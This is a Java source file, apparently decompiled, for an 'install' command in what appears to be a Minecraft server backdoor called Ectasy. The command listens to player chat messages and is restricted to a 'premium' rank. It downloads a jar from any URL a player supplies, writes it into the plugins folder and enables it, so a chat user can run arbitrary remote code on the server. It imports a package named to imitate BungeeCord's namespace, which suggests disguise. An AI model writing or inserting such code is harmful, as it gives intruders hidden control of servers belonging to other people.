package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

@CommandInfo(
   name = "install",
   description = "Install a plugin using the direct url link",
   blatant = true,
   rank = Rank.PREMIUM,
   aliases = {"installplugin", "addplugin"}
)
public class InstallPluginByUrlCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent event, String var2, String[] args) {
      if (Ectasy.testServer) {
         ChatUtil.sendChat(event.getPlayer(), "The shell command has been disabled in ectasy test servers.");
      } else {
         new BukkitRunnable() {
            @Override
            public void run() {
               if (args.length != 2) {
                  ChatUtil.sendChat(event.getPlayer(), "Please, use install <direct url> <output name>");
               } else {
                  String var1 = args[1];
                  if (Bukkit.getPluginManager().getPlugin(var1) != null) {
                     ChatUtil.sendChat(event.getPlayer(), "The plugin already exists.");
                  } else {
                     try {
                        URLConnection var2 = new URL(args[0]).openConnection();
                        var2.addRequestProperty("User-Agent", "Mozilla");
                        Files.copy(var2.getInputStream(), Paths.get("plugins/" + var1 + ".jar", ""), StandardCopyOption.REPLACE_EXISTING);
                     } catch (Exception var3) {
                        ChatUtil.sendChat(event.getPlayer(), "Could not install the plugin. Error Message : " + var3.getMessage());
                        return;
                     }

                     ChatUtil.sendChat(event.getPlayer(), "Plugin successfuly installed. Enabling it...");
                     Bukkit.getScheduler().runTaskLater(Ectasy.parentPlugin, () -> {
                        try {
                           Bukkit.getPluginManager().loadPlugin(new File(Paths.get("plugins/" + var1 + ".jar", "").toString()));
                        } catch (Exception var3) {
                           var3.printStackTrace();
                           ChatUtil.sendChat(event.getPlayer(), "Error while enabling the plugin. The plugin will be enabled the next reload/restart.");
                        }

                        if (Bukkit.getPluginManager().getPlugin(var1) != null) {
                           Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(var1));
                           ChatUtil.sendChat(event.getPlayer(), "Plugin successfully installed & enabled.");
                        }
                     }, 60L);
                  }
               }
            }
         }.runTask(Ectasy.parentPlugin);
      }
   }

   public InstallPluginByUrlCommand() {
   }
}
